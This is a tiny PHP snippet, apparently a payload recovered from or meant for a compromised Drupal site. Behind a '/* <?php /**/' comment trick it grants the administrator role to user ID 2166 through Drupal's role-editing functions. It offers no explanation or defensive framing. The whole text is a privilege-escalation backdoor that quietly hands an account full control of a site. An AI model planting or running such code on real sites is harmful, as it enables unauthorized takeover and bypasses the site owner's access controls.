/* <?php /**/

$role = user_role_load_by_name("administrator");
user_multiple_role_edit(array(2166), 'add_role', $role->rid);
